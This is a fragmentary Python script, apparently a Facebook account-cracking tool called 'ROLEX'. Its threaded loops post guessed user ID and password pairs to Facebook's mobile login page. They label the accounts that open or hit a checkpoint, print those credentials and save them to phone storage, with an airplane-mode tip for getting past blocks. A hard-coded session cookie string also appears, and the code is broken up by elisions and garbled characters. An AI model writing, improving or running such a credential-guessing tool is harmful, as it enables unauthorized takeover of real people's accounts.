...
###-----------------------[CREATOR INFO]-----------------------###
Developer = "MD Sabbir Hossain Rafi" 
Github = "DARK404-CYBER" 
...
▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
 CEO      :    MD Sabbir Hossain Rafi🚫 
 CEO       :    HASAN MUHAMMAD IFRAN🚫
 Github     :    DARK-404
 Version    :    3.3
▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
\t      {N}[{Brown} {xyztime()} {N}]
  ...
  #  elif Apps in["Y","y"]:
   ...
   # print(f"{N}â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€{Y}âž¤{H}âž¤{R}âž¤{N}â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€{P}") 
    ...
    with ThreadPool(max_workers=30) as XYZCODERS:    
        ...
        print(f"{N}[{H}{N}] Your {H}OK{N}/{Y}CP {N}IDs Save In {H}> {N}/sdcard/ROLEX")
        #line()
  ...
  #  elif Apps in["Y","y"]:
   ...
   # print(f"{N}â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€{Y}âž¤{H}âž¤{R}âž¤{N}â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€{P}") 
    ...
    with ThreadPool(max_workers=50) as XYZCODERS:
        ...
        print(f"{N}[{H}{N}]{H} OPERATOR  {Brown}{N} "+code+f"{H} TOTAL IDs {Brown}{N} "+tl+" ")
        print(f"{N}[{H}{N}] TODAY DATE & TIME :{R} {day}/{month}/{year} {Brown}â”€âž¤ {H} "+str(x)+":"+str(lt()[4])+" "+ tag+" ")
        print(f"{N}[{H}{N}]{Brown} If No Result {N}[{H}ON{N}/{R}OFF{N}]{Brown} Airplane Mode")
        print(f"{N}[{H}{N}] Your {H}OK{N}/{Y}CP {N}IDs Save In {H}> {N}/sdcard/ROLEX")
        #line()
        for xyzcoderz in user:
...
def YounisXyz(uid,pwx,tl):
    ...
    # 'cookie': 'datr=5xXbZAkyio8HeMRVK853-E0P; sb=5xXbZHbL7msAEAhY6QhsTnB_; locale=en_US; dpr=2.1988937854766846; fr=0YBKlVTpFfMHNuywE..Bk2xXn.7i.AAA.0.0.BlCTWe.AWWvap-kTbE; wd=891x1802',
    'dpr': '2',
    ...
    'viewport-width': '980',}
            lo = session.post('https://mbasic.facebook.com/login/?ref=dbl&fl&login_from_aymh=1',data=log_data,headers=xyzheader_fuck).text
            ...
            if 'c_user' in log_cookies:
               ...
               # try:os.popen('play-audio Voice/ROMII_OK.mp3')
                #except:pass
                if "y" in Cookie:
                	print(f'\r{H}[ROLEX-OK] '+uid+' | '+ps+ '\033[1;93m '+creation(uid)+' ')
                ...
                if 'Enter login code to continue' in log_cookies:
                  ...
                  #  except:pass
                    if "y" in Cp:
                    	print(f'\r{R}[ROLEX-CP”] '+uid+' | '+ps+'\033[1;93m '+creation(uid)+' ')
